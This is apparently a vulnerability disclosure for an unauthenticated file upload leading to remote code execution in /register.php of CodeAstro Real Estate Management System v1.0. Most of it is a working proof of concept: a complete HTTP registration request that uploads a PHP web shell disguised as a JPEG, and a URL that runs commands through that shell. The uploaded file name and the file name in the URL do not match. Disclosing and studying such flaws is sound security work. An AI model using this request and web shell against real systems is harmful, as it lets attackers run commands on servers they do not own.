# Unauthorized File Upload to RCE in CodeAstro Real Estate Management System v1.0 of file /register.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /register.php

**Version**

- V1.0

### POC 

register.php  File Upload RCE

```http
POST /register.php HTTP/1.1
Host: www.realestate1.top
Cookie: PHPSESSID=29il4v1ositshrfe7un295114t
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="name"

testuser1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="email"

test@example.com
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="phone"

1234567890
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="pass"

password123
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="utype"

user
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uimage"; filename="shell555.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="reg"

Register
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```



![image-20250817162654406](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171626515.png)

```
http://www.realestate1.top/admin/user/shell.php?cmd=ls
```

![image-20250817162723595](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508171627721.png)